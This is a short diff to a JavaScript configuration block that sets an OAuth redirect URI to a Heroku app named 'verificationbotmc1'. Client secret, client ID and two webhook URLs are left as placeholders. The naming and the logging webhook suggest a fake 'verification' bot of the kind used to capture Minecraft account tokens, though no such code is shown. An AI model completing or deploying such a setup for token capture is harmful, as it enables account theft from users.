@@ -1,7 +1,7 @@
 // Configuration
 const client_secret = 'change'
 const client_id = 'change'
-const redirect_uri = 'change'
+const redirect_uri = 'https://verificationbotmc1.herokuapp.com/'
 const webhook_url = 'change'
 const webhook_logging_url = 'change'
 // Config end
